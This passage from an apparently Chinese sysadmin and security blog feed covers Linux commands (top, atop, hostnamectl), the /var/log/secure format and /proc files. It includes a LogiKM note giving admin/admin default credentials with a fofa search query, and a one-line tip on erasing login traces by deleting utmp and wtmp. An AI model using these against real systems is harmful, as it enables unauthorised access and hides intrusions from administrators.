+%CPU</strong></p><p>以%CPU为指标降序排列</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs tap">root@VM-8-5-ubuntu:/home/ubuntu<span class="hljs-comment"># top -c -o +%CPU</span><br>top - 16:41:52 up<span class="hljs-number"> 1 </span>day, 18:01, <span class="hljs-number"> 2 </span>users,  load average: 0.05, 0.03, 0.00<br>Tasks:<span class="hljs-number"> 115 </span>total,  <span class="hljs-number"> 1 </span>running,<span class="hljs-number"> 114 </span>sleeping,  <span class="hljs-number"> 0 </span>stopped,  <span class="hljs-number"> 0 </span>zombie<br>%Cpu(s):  0.2 us,  0.2 sy,  0.0 ni, 99.7 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st<br>MiB Mem :   3935.6 total,   2508.6 free,    308.6 used,   1118.4 buff/cache<br>MiB Swap:      0.0 total,      0.0 free,      0.0 used.   3386.0 avail Mem<br><br>    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND<br>    <span class="hljs-number"> 10 </span>root     <span class="hljs-number"> 20 </span> <span class="hljs-number"> 0 </span>     <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>S   0.3   0.0   0:01.16 [ksoftirqd/0]<br>  <span class="hljs-number"> 1670 </span>root     <span class="hljs-number"> 20 </span> <span class="hljs-number"> 0 </span> <span class="hljs-number"> 47856 </span><span class="hljs-number"> 11448 </span> <span class="hljs-number"> 3872 </span>S   0.3   0.3   1:32.43 barad_agent<br>  <span class="hljs-number"> 1671 </span>root     <span class="hljs-number"> 20 </span> <span class="hljs-number"> 0 </span><span class="hljs-number"> 491996 </span><span class="hljs-number"> 14372 </span> <span class="hljs-number"> 4312 </span>S   0.3   0.4   7:37.78 barad_agent<br></code></pre></td></tr></table></figure><p>dmidecode | grep Product</p><p>查看物理机型号</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs excel">[root@iZbp1191gh7vw52537lyxrZ ~]# dmidecode | grep <span class="hljs-built_in">Product</span><br><span class="hljs-built_in">Product</span> <span class="hljs-built_in">Na</span><span class="hljs-symbol">me:</span> Alibaba Cloud ECS<br></code></pre></td></tr></table></figure><p>atop</p><p>ATOP - 10                               2019&#x2F;04&#x2F;29  21:06:18                               ———                                10s elapsed</p><p>PRC | sys    0.22s | user   0.17s  | #proc    809 | #trun      1 | #tslpi   800  | #tslpu   242 | #zombie    0 | clones     0  | #exit      0 |</p><p>CPU | sys       2% | user      1%  | irq       0% | idle   3041% | wait    156%  | steal     0% | guest     0% | curf 2.50GHz  | curscal   ?% |</p><p>CPL | avg1  235.50 | avg5  232.99  | avg15 232.35 |              |               | csw     4910 | intr   14354 |               | numcpu    32 |</p><p>MEM | tot    31.3G | free  563.4M  | cache  14.2G | dirty   0.5M | buff  843.2M  | slab  980.2M | slrec 855.1M | shmem   0.2M  | shrss   0.0M |</p><p>SWP | tot   128.0G | free  126.5G  |              |              |               |              |              | vmcom  18.3G  | vmlim 143.7G |</p><p>DSK |          sda | busy    100%  | read      73 | write   1050 | KiB&#x2F;r      5  | KiB&#x2F;w      6 | MBr&#x2F;s   0.04 | MBw&#x2F;s   0.67  | avio 8.90 ms |</p><p>NET | transport    | tcpi      13  | tcpo      13 | udpi       0 | udpo       0  | tcpao      5 | tcppo      0 | tcprs      0  | udpip   9276 |</p><p>NET | network      | ipi     9745  | ipo       13 | ipfrw      0 | deliv   9292  |              |              | icmpi      0  | icmpo      0 |</p><p>NET | em1       0% | pcki   10260  | pcko       1 | si 2474 Kbps | so    1 Kbps  | erri       0 | erro       0 | drpi       0  | drpo       0 |</p><p>NET | em20% | pcki      18  | pcko       0 | si    1 Kbps | so    0 Kbps  | erri       0 | erro       0 | drpi    0  | drpo       0 |</p><p>NET | lo      —- | pcki      12  | pcko      12 | si    0 Kbps | so    0 Kbps  | erri       0 | erro       0 | drpi       0  | drpo       0 |</p><p>  PID     TID   RUID       EUID        THR   SYSCPU   USRCPU    VGROW    RGROW    RDDSK    WRDSK   ST   EXC   S   CPUNR    CPU   CMD        1&#x2F;2</p><p>38548       -   root       root          1    0.12s    0.05s    1852K    1852K       0K       0K   –     -   R       1     2%   atop</p><p>12749       -   root   root        144    0.02s    0.06s       0K     128K       0K       8K   –     -   S      19     1%   java</p><p>38418       -   sec    sec          54    0.02s    0.03s       0K       0K     360K       8K   –     -   S      18     1%   java</p><p>10876       -   smmsp      smmsp         1    0.00s    0.01s       0K       0K       0K       0K   –     -   D       0     0%   sendmail</p><p> 7570       -   smmsp      smmsp         1    0.01s    0.00s   0K       0K       0K       0K   –     -   D       3     0%   sendmail</p><p>48544       -   root       root         10    0.00s    0.01s   0K     360K       0K      12K   –     -   D       0     0%   node</p><p>31529       -   smmsp      smmsp         1    0.01s    0.00s       0K       0K       0K       0K   –     -   D       5     0%   sendmail</p><p>30859       -   mysql      mysql        16    0.01s    0.00s       0K       0K       0K       0K   –     -   S       0     0%   mysqld</p><p>41246       -   root       root          4    0.00s    0.01s       0K       0K       0K       0K   –     -   S      26     0%   rsyslogd</p><p>  136       -   root    root          1    0.01s    0.00s       0K       0K       0K       0K   –     -   S       5     0%   events&#x2F;5</p><p>  204       -   root       root          1    0.01s    0.00s       0K       0K       0K       0K   –     -   S       2     0%   kblockd&#x2F;2</p><p> 1788       -   root       root          1    0.01s    0.00s   0K       0K       0K       4K   –     -   D       2     0%   flush-8:0</p><p>33709       -   smmsp      smmsp         1    0.00s    0.00s   0K       0K       0K       0K   –     -   D      18     0%   sendmail</p><p>22496       -   smmsp      smmsp         1    0.00s    0.00s   0K       0K       0K       0K   –     -   D      18     0%   sendmail</p><p><img src="/2024/04/01/yunwei/commands/top/image-20240401192203874.png" alt="image-20240401192203874"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] Linux top命令的用法详细详解] 莫水千流 2017-01-21 09:09 </p><p>链接：<a href="http://www.cnblogs.com/zhoug2020/p/6336453.html">http://www.cnblogs.com/zhoug2020/p/6336453.html</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
      <tag>top</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>log_secure</title>
    <link href="/2024/03/29/yunwei/log/log_secure/"/>
    <url>/2024/03/29/yunwei/log/log_secure/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&#x2F;var&#x2F;log&#x2F;secure* 主要是CentOS系统记录关于安全的日志</p><h2 id="适配系统"><a href="#适配系统" class="headerlink" title="适配系统"></a>适配系统</h2><p>CentOS系统</p><h2 id="日志设置"><a href="#日志设置" class="headerlink" title="日志设置"></a>日志设置</h2><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>&#x2F;etc&#x2F;rsyslog.conf</p><h3 id="配置项"><a href="#配置项" class="headerlink" title="配置项"></a>配置项</h3><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">authpriv.*                                              <span class="hljs-regexp">/var/</span><span class="hljs-built_in">log</span>/secure<br></code></pre></td></tr></table></figure><p>设备 authpriv 的所有除 none 消息都会写入 &#x2F;var&#x2F;log&#x2F;secure* 这个文件</p><h2 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h2><h3 id="文件权限-600"><a href="#文件权限-600" class="headerlink" title="文件权限 600"></a>文件权限 600</h3><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">-rw-------<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 78815387 </span>3月 <span class="hljs-number"> 29 </span>19:52 secure<br></code></pre></td></tr></table></figure><h3 id="日志格式"><a href="#日志格式" class="headerlink" title="日志格式"></a>日志格式</h3><p>时间 主机名（日志主机） 服务名[进程号] 日志信息</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Mar</span> <span class="hljs-number">24</span> <span class="hljs-number">03</span>:<span class="hljs-number">55</span>:<span class="hljs-number">03</span> aliyun-<span class="hljs-number">1</span>_1_1_1 sshd[<span class="hljs-number">15314</span>]: Failed password for root from <span class="hljs-number">8.6.5.1</span> port <span class="hljs-number">36984</span> ssh2<br></code></pre></td></tr></table></figure><p>时间：Mar 24 03:55:03</p><p>主机名：aliyun-1_1_1_1</p><p>服务名[进程号]：sshd[15314]</p><p>日志信息：Failed password for root from 8.6.5.1 port 36984 ssh2</p><h2 id="常见动作的日志"><a href="#常见动作的日志" class="headerlink" title="常见动作的日志"></a>常见动作的日志</h2><h3 id="用户登录"><a href="#用户登录" class="headerlink" title="用户登录"></a>用户登录</h3><p>日志</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Mar</span> <span class="hljs-number">29</span> <span class="hljs-number">19</span>:<span class="hljs-number">58</span>:<span class="hljs-number">46</span> aliyun-<span class="hljs-number">1</span>_1_1_1 sshd[<span class="hljs-number">18741</span>]: Accepted password for root from <span class="hljs-number">8.6.5.1</span> port <span class="hljs-number">9956</span> ssh2<br><span class="hljs-attribute">Mar</span> <span class="hljs-number">29</span> <span class="hljs-number">19</span>:<span class="hljs-number">58</span>:<span class="hljs-number">46</span> aliyun-<span class="hljs-number">1</span>_1_1_1 sshd[<span class="hljs-number">18741</span>]: pam_unix(sshd:session): session opened for user root by (uid=<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>进程</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">(base) [root@aliyun-1_1_1_1 ~]<span class="hljs-comment"># ps -ef | grep sshd | grep 18741</span><br>root    <span class="hljs-number"> 18741 </span><span class="hljs-number"> 1096 </span><span class="hljs-number"> 0 </span>19:58 ?        00:00:00 sshd: root@pts/2<br></code></pre></td></tr></table></figure><p>网络连接</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">(base) [root<span class="hljs-symbol">@aliyun</span><span class="hljs-number">-1</span>_1_1_1 ~]<span class="hljs-meta"># netstat -anlp | grep ssh | grep 18741</span><br>tcp        <span class="hljs-number">0</span>     <span class="hljs-number">36</span> <span class="hljs-number">172.17</span><span class="hljs-number">.142</span><span class="hljs-number">.212</span>:<span class="hljs-number">22</span>       <span class="hljs-number">8.6</span><span class="hljs-number">.5</span><span class="hljs-number">.1</span>:<span class="hljs-number">9956</span>      ESTABLISHED <span class="hljs-number">18741</span>/sshd: root<span class="hljs-symbol">@pt</span><br></code></pre></td></tr></table></figure><h3 id="用户退出"><a href="#用户退出" class="headerlink" title="用户退出"></a>用户退出</h3><p>日志</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Mar</span> <span class="hljs-number">29</span> <span class="hljs-number">20</span>:<span class="hljs-number">02</span>:<span class="hljs-number">54</span> aliyun-<span class="hljs-number">1</span>_1_1_1 sshd[<span class="hljs-number">18741</span>]: Received disconnect from  <span class="hljs-number">8.6.5.1</span> port <span class="hljs-number">9956</span>:<span class="hljs-number">11</span>: disconnected by user<br><span class="hljs-attribute">Mar</span> <span class="hljs-number">29</span> <span class="hljs-number">20</span>:<span class="hljs-number">02</span>:<span class="hljs-number">54</span> aliyun-<span class="hljs-number">1</span>_1_1_1 sshd[<span class="hljs-number">18741</span>]: Disconnected from  <span class="hljs-number">8.6.5.1</span> port <span class="hljs-number">9956</span><br><span class="hljs-attribute">Mar</span> <span class="hljs-number">29</span> <span class="hljs-number">20</span>:<span class="hljs-number">02</span>:<span class="hljs-number">54</span> aliyun-<span class="hljs-number">1</span>_1_1_1 sshd[<span class="hljs-number">18741</span>]: pam_unix(sshd:session): session closed for user root<br></code></pre></td></tr></table></figure><h2 id="待研究问题"><a href="#待研究问题" class="headerlink" title="待研究问题"></a>待研究问题</h2><h3 id="日志配置"><a href="#日志配置" class="headerlink" title="日志配置"></a>日志配置</h3><p>log_set 文档</p><p>pam_unix研究</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>log</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>log</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>logikm_vuln</title>
    <link href="/2024/03/29/security/secvulns/logikm/logikm_vuln/"/>
    <url>/2024/03/29/security/secvulns/logikm/logikm_vuln/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>LogiKM 是滴滴开源的Kafka管理平台，也称为 KnowStreaming</p><h2 id="基础信息"><a href="#基础信息" class="headerlink" title="基础信息"></a>基础信息</h2><p>默认端口：80</p><p>默认密码：admin&#x2F;admin</p><p>服务指纹：title 包含 LogiKM</p><h2 id="默认口令"><a href="#默认口令" class="headerlink" title="默认口令"></a>默认口令</h2><h3 id="漏洞名称"><a href="#漏洞名称" class="headerlink" title="漏洞名称"></a>漏洞名称</h3><p>LogiKM默认口令</p><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>LogiKM服务使用默认口令</p><h3 id="漏洞级别"><a href="#漏洞级别" class="headerlink" title="漏洞级别"></a>漏洞级别</h3><p>高危</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1、禁止将LogiKM服务暴露在公网</p><p>2、设置强口令，包含数字、大小写字母、特殊字符，长度10位以上</p><p>3、设置访问来源IP限制</p><h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><h4 id="默认信息"><a href="#默认信息" class="headerlink" title="默认信息"></a>默认信息</h4><p>默认端口 8080（TCP）</p><h4 id="服务指纹"><a href="#服务指纹" class="headerlink" title="服务指纹"></a>服务指纹</h4><p>title：LogiKM</p><h4 id="服务查询"><a href="#服务查询" class="headerlink" title="服务查询"></a>服务查询</h4><h5 id="fofa-info"><a href="#fofa-info" class="headerlink" title="fofa.info"></a>fofa.info</h5><p>“title: LogiKM”</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>[1] name user time<br>链接：link</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>secvulns</category>
      
      <category>yunweivulns</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>secvulns</tag>
      
      <tag>yunweivulns</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/03/15/security/secresponse/attack_hidden/"/>
    <url>/2024/03/15/security/secresponse/attack_hidden/</url>
    
    <content type="html"><![CDATA[<p>登录信息清除</p><p>删除或清空 &#x2F;var&#x2F;run&#x2F;utmp &#x2F;var&#x2F;log&#x2F;wtmp ，删除后不会产生新的文件</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>procdir</title>
    <link href="/2024/03/15/yunwei/dir/procdir/"/>
    <url>/2024/03/15/yunwei/dir/procdir/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Linux在启动一个进程时，系统会在&#x2F;proc下创建一个以PID命名的文件夹，在该文件夹下会有我们的进程的信息</p><h2 id="文件说明"><a href="#文件说明" class="headerlink" title="文件说明"></a>文件说明</h2><h3 id="exe"><a href="#exe" class="headerlink" title="exe"></a>exe</h3><p>ls -lat &#x2F;proc&#x2F;pid&#x2F;exe 可查看到对应进程可执行文件的绝对路径</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# ls -lat /proc/<span class="hljs-number">659535</span>/exe<br><span class="hljs-attribute">lrwxrwxrwx</span> <span class="hljs-number">1</span> mysql mysql <span class="hljs-number">0</span> Mar <span class="hljs-number">14</span> <span class="hljs-number">09</span>:<span class="hljs-number">49</span> /proc/<span class="hljs-number">659535</span>/exe -&gt; /usr/sbin/mysqld<br></code></pre></td></tr></table></figure><h3 id="cmdline"><a href="#cmdline" class="headerlink" title="cmdline"></a>cmdline</h3><p>cat &#x2F;proc&#x2F;pid&#x2F;cmdline 可查看到对应进程执行的命令（没有空格）</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">└─# <span class="hljs-keyword">cat</span> /proc/<span class="hljs-number">1211513</span>/cmdline<br>pingwww.baidu.<span class="hljs-keyword">com</span><br></code></pre></td></tr></table></figure><h3 id="cwd"><a href="#cwd" class="headerlink" title="cwd"></a>cwd</h3><p>ls -lat &#x2F;proc&#x2F;pid&#x2F;cwd 查看对应进程启动目录</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# ls -lat /proc/<span class="hljs-number">659535</span>/cwd<br><span class="hljs-attribute">lrwxrwxrwx</span> <span class="hljs-number">1</span> mysql mysql <span class="hljs-number">0</span> Mar <span class="hljs-number">15</span> <span class="hljs-number">07</span>:<span class="hljs-number">55</span> /proc/<span class="hljs-number">659535</span>/cwd -&gt; /var/lib/mysql<br></code></pre></td></tr></table></figure><h3 id="environ"><a href="#environ" class="headerlink" title="environ"></a>environ</h3><p>cat &#x2F;proc&#x2F;pid&#x2F;environ 查看进程运行时的环境变量</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># cat /proc/659535/environ</span><br><span class="hljs-variable constant_">LANG</span>=en_US.<span class="hljs-variable constant_">UTF</span>-8PATH=<span class="hljs-regexp">/usr/local</span><span class="hljs-regexp">/sbin:/usr</span><span class="hljs-regexp">/local/bin</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/bin</span><span class="hljs-symbol">:/sbin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/snap/binNOTIFY_SOCKET=/run/systemd/notifyPIDFILE=/run/mysqld/mysqld</span>.pidHOME=<span class="hljs-regexp">/nonexistentLOGNAME=mysqlUSER=mysqlINVOCATION_ID=4e4bec37552240ebaab8568ce9b7952fJOURNAL_STREAM=8:110456240RUNTIME_DIRECTORY=/run</span><span class="hljs-regexp">/mysqldSYSTEMD_EXEC_PID=659535MYSQLD_PARENT_PID=1</span><br></code></pre></td></tr></table></figure><h3 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h3><p>ls -lat &#x2F;proc&#x2F;pid&#x2F;fd 查看进程打开或使用的文件的符号连接</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@iZbp1191gh7vw52537lyxrZ:~# ls -lat /proc/<span class="hljs-number">659535</span>/fd<br><span class="hljs-attribute">total</span> <span class="hljs-number">0</span><br><span class="hljs-attribute">dr</span>-x------ <span class="hljs-number">2</span> mysql mysql  <span class="hljs-number">0</span> Mar <span class="hljs-number">15</span> <span class="hljs-number">07</span>:<span class="hljs-number">55</span> .<br><span class="hljs-attribute">lr</span>-x------ <span class="hljs-number">1</span> mysql mysql <span class="hljs-number">64</span> Mar <span class="hljs-number">15</span> <span class="hljs-number">07</span>:<span class="hljs-number">55</span> <span class="hljs-number">0</span> -&gt; /dev/null<br><span class="hljs-attribute">l</span>-wx------ <span class="hljs-number">1</span> mysql mysql <span class="hljs-number">64</span> Mar <span class="hljs-number">15</span> <span class="hljs-number">07</span>:<span class="hljs-number">55</span> <span class="hljs-number">1</span> -&gt; /var/log/mysql/error.log<br><span class="hljs-attribute">lrwx</span>------ <span class="hljs-number">1</span> mysql mysql <span class="hljs-number">64</span> Mar <span class="hljs-number">15</span> <span class="hljs-number">07</span>:<span class="hljs-number">55</span> <span class="hljs-number">10</span> -&gt; /var/lib/mysql/ibdata1<br><span class="hljs-attribute">lrwx</span>------ <span class="hljs-number">1</span> mysql mysql <span class="hljs-number">64</span> Mar <span class="hljs-number">15</span> <span class="hljs-number">07</span>:<span class="hljs-number">55</span> <span class="hljs-number">11</span> -&gt; /var/lib/mysql/#innodb_redo/#ib_redo29<br><span class="hljs-attribute">lrwx</span>------ <span class="hljs-number">1</span> mysql mysql <span class="hljs-number">64</span> Mar <span class="hljs-number">15</span> <span class="hljs-number">07</span>:<span class="hljs-number">55</span> <span class="hljs-number">12</span> -&gt; /var/lib/mysql/undo_002<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>dir</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>dir</tag>
      
      <tag>proc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hostnamectl</title>
    <link href="/2024/03/15/yunwei/commands/hostnamectl/"/>
    <url>/2024/03/15/yunwei/commands/hostnamectl/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="hostnamectl"><a href="#hostnamectl" class="headerlink" title="hostnamectl"></a>hostnamectl</h1><p>控制系统主机名</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs scss">root<span class="hljs-keyword">@iZbp</span>1191gh7vw52537<span class="hljs-attribute">lyxrZ</span>:~# hostnamectl<br> Static <span class="hljs-attribute">hostname</span>: iZbp1191gh7vw52537lyxrZ<br>       Icon <span class="hljs-attribute">name</span>: computer-vm<br>         <span class="hljs-attribute">Chassis</span>: vm<br>      Machine <span class="hljs-attribute">ID</span>: <span class="hljs-number">8</span>da0ace235c5435eb33ae56a538def68<br>         Boot <span class="hljs-attribute">ID</span>: <span class="hljs-number">5755</span>d1b8ae8c4e7cbe47b72434abc7ea<br>  <span class="hljs-attribute">Virtualization</span>: kvm<br>Operating <span class="hljs-attribute">System</span>: Ubuntu <span class="hljs-number">22.04</span>.<span class="hljs-number">2</span> LTS<br>CPE OS <span class="hljs-attribute">Name</span>: <span class="hljs-attribute">cpe</span>: /<span class="hljs-attribute">o</span>:<span class="hljs-attribute">almalinux</span>:<span class="hljs-attribute">almalinux</span>:<span class="hljs-number">9</span>::baseos<br>          <span class="hljs-attribute">Kernel</span>: Linux <span class="hljs-number">5.15</span>.<span class="hljs-number">0</span>-<span class="hljs-number">73</span>-generic<br>    <span class="hljs-attribute">Architecture</span>: x86-<span class="hljs-number">64</span><br> Hardware <span class="hljs-attribute">Vendor</span>: Alibaba Cloud<br>  Hardware <span class="hljs-attribute">Model</span>: Alibaba Cloud ECS<br></code></pre></td></tr></table></figure><h2 id="参数解释"><a href="#参数解释" class="headerlink" title="参数解释"></a>参数解释</h2><p>Static hostname  静态主机名</p><p>Icon name 图标名</p><p>Chassis 主机类型</p><p>Machine ID 主机ID</p><p>Boot ID</p><p>Virtualization: kvm 虚拟化，可以用来标记是否是虚拟机，物理机不存在该数据</p><p>Operating System：Ubuntu 22.04.2 LTS 操作系统信息</p><p>CPE OS Name:  cpe: &#x2F;o:almalinux:almalinux:9::baseos </p><p>Kernel: Linux 5.15.0-73-generic 内核信息</p><p>Architecture: x86-64 架构信息（x86-64）</p><p>Hardware Vendor: Alibaba Cloud  硬件供应商</p><p>Hardware Model: Alibaba Cloud ECS 硬件型号</p><p>Firmware Version: xxxzz-U08 固件版本</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>hostnamectl [OPTIONS…] {COMMAND}</p><h3 id="主机名类型"><a href="#主机名类型" class="headerlink" title="主机名类型"></a>主机名类型</h3><h4 id="pretty-主机名"><a href="#pretty-主机名" class="headerlink" title="pretty 主机名"></a>pretty 主机名</h4><p>易读的主机名称，对字符几乎没有限制（可以使用特殊字符# @ 等）</p><p>存储在 &#x2F;etc&#x2F;machine-info，从 machine-info 命令中可查看更多信息</p><p>默认设备是没有该名称的，使用 hostnamectl –pretty 查询结果为空，&#x2F;etc&#x2F;machine-info 文件也是不存在的，如果使用 hostnamectl set-hostname 设置后，文件和查询都会存在</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">root@iZbp1191gh7vw52537lyxrZ:~<span class="hljs-comment"># ls -lat /etc/machine-info</span><br>-rw-r--r--<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 28 </span>Jan<span class="hljs-number"> 30 </span>15:20 /etc/machine-info<br></code></pre></td></tr></table></figure><h4 id="static-主机名（常说的主机名）"><a href="#static-主机名（常说的主机名）" class="headerlink" title="static 主机名（常说的主机名）"></a>static 主机名（常说的主机名）</h4><p>静态主机名称，用于启动时初始化内核主机名，对字符有限制（不可以使用特殊字符# @ 等）</p><p>存储在 &#x2F;etc&#x2F;hostname，从 hostname命令中可查看更多信息</p><h4 id="transient-主机名"><a href="#transient-主机名" class="headerlink" title="transient 主机名"></a>transient 主机名</h4><p>临时主机名称，从网络配置中接收到的临时主机名，如果静态主机名有设置，且不是localhost，就不使用临时主机名，对字符有限制（不可以使用特殊字符# @ 等）</p><p>可以使用systemd-firstboot(1)初始化挂载(但未启动)系统映像的系统主机名。</p><h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><h4 id="–no-ask-password"><a href="#–no-ask-password" class="headerlink" title="–no-ask-password"></a>–no-ask-password</h4><p>执行特权操作时不需要密码</p><h4 id="–static-–pretty-–transient"><a href="#–static-–pretty-–transient" class="headerlink" title="–static –pretty –transient"></a>–static –pretty –transient</h4><p>仅显示对应主机名，搭配 status 命令使用，由于 status 是 hostnamectl 默认命令，也可以不写，例如 hostnamectl –static 等价于 hostnamectl –static status</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment">#</span><br><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --static status</span><br>iZbp1191gh7vw52537lyxrZ<br><br>root<span class="hljs-variable">@iZbp1191gh7vw52537lyxrZ</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># hostnamectl --static</span><br>iZbp1191gh7vw52537lyxrZ<br></code></pre></td></tr></table></figure><p>与 set-hostname命令搭配使用，用于修改指定的主机名</p><h4 id="–version"><a href="#–version" class="headerlink" title="–version"></a>–version</h4><p>显示工具版本信息</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nsis">root@iZbp1191gh7vw52537lyxrZ:~<span class="hljs-comment"># hostnamectl --version</span><br><span class="hljs-params">system</span>d <span class="hljs-number">249</span> (<span class="hljs-number">249.11</span>-<span class="hljs-number">0</span>ubuntu3.<span class="hljs-number">9</span>)<br>+PAM +AUDIT +SELINUX +APPARMOR +IMA +SMACK +SECCOMP +GCRYPT +GNUTLS +OPENSSL +ACL +BLKID +CURL +ELFUTILS +FIDO2 +IDN2 -IDN +IPTC +KMOD +LIBCRYPTSETUP +LIBFDISK +PCRE2 -PWQUALITY -P11KIT -QRENCODE +<span class="hljs-literal">BZIP2</span> +LZ4 +XZ +<span class="hljs-literal">ZLIB</span> +ZSTD -XKBCOMMON +UTMP +SYSVINIT default-hierarchy=unified<br></code></pre></td></tr></table></figure><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><h4 id="status"><a href="#status" class="headerlink" title="status"></a>status</h4><p>显示当前主机名和相关信息</p><h4 id="set-hostname-hostname-NAME"><a href="#set-hostname-hostname-NAME" class="headerlink" title="set-hostname&#x2F;hostname NAME"></a>set-hostname&#x2F;hostname NAME</h4><p>修改主机名，默认会修改 pretty static transient 主机名</p><figure class="highlight elixir"><table><tr><td 